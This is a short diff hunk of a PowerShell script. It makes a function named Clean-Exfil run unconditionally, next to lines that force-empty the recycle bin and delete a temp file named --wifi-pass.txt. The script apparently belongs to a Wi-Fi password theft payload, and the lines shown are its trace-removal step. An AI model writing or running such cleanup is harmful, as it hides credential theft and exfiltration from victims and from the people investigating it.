@@ -54,7 +54,7 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 ############################################################################################################################################################
 
-if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
+Clean-Exfil
 
 
 RI $env:TEMP/--wifi-pass.txt
